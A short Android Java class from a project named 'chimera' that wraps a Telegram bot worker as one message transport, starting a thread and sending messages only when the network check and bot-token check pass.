package com.chimera;

import android.content.Context;

public class TelegramTransport implements Transport {
    private Thread worker;
    private volatile boolean running = false;

    @Override public String name() { return "telegram"; }

    @Override
    public boolean isHealthy(Context ctx) {
        // Telegram is secondary but still gated - needs heartbeat net, but allow degraded for text
        return NetworkStateMonitor.canAttemptHeartbeat(ctx) && ConfigLoader.getBotToken() != null;
    }

    @Override
    public void start(Context ctx) {
        if (running) return;
        if (!isHealthy(ctx)) return;
        running = true;
        try {
            worker = new Thread(new TelegramBotWorker(ctx, () -> {
                // activity callback resets watchdog? keep
            }));
            worker.start();
        } catch (Exception e) { ErrorLogger.logError(ctx, "TelegramTransport_start", e); running = false; }
    }

    @Override
    public void send(String message, Context ctx) {
        // Gated
        if (!NetworkStateMonitor.canAttemptHeartbeat(ctx)) return;
        TelegramBotWorker.sendMessage(message, ctx);
    }

    @Override public void stop() {
        running = false;
        try { if (worker != null) worker.interrupt(); } catch (Exception ignored) {}
    }
}
